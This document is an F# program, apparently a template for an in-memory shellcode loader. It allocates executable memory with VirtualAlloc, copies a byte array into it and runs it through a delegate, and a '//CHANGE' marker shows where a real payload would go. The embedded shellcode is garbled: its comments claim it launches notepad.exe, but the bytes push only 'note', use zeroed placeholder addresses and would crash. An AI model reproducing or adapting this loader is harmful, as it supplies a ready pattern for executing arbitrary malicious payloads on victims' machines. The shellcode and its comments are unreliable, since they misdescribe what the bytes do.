open System
open System.Runtime.InteropServices

//As defined in Microsoft API docs
module Program =
    [<DllImport("kernel32.dll", SetLastError = true)>]
    extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect)

    [<DllImport("kernel32.dll")>]
    extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType)

    [<DllImport("kernel32.dll")>]
    extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, uint& lpflOldProtect)

// Below variables values are as defined in Microsoft API docs
    let MEM_COMMIT = 0x00001000u
    let PAGE_EXECUTE_READWRITE = 0x40u
    let PAGE_READWRITE = 0x04u
    let MEM_RELEASE = 0x00008000u

    // Define a delegate type that matches the signature of the function to be called
    [<UnmanagedFunctionPointer(CallingConvention.Cdecl)>]
    type ActionDelegate = delegate of unit -> unit

    let executeShellcode() =
        let Shellcode : byte[] = [|
            // Push the parameters for WinExec
            byte 0x6a; byte 0x00   // push 0 (uCmdShow)
            byte 0x68; byte 0x6e; byte 0x6f; byte 0x74; byte 0x65  // push "notepad.exe" (address of string)
            byte 0x68; byte 0x00; byte 0x00; byte 0x00; byte 0x00  // push address of string placeholder (address of WinExec)
            byte 0x6a; byte 0x00   // push 0 (the 'lpReserved' parameter)
            byte 0x50             // push eax (the address of WinExec function)
            byte 0xff; byte 0x15   // call [address of kernel32.WinExec]
            byte 0x00; byte 0x00; byte 0x00; byte 0x00  // address of kernel32.WinExec (placeholder)
            byte 0xc3             // ret (return from function)
        |]   //CHANGE 

        let ShellcodeSize = UIntPtr(uint32 Shellcode.Length)
        let exec = VirtualAlloc(IntPtr.Zero, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        
        if exec = IntPtr.Zero then
            failwith "Memory allocation failed"

        Marshal.Copy(Shellcode, 0, exec, Shellcode.Length)

        let mutable oldProtect = PAGE_READWRITE
        if not (VirtualProtect(exec, ShellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect)) then
            failwith "Failed to change memory protection"

        let func = Marshal.GetDelegateForFunctionPointer<ActionDelegate>(exec)
        func.Invoke()


        // Clean up memory
        VirtualFree(exec, UIntPtr.Zero, MEM_RELEASE)

    [<EntryPoint>]
    let main argv =
        executeShellcode()
        0
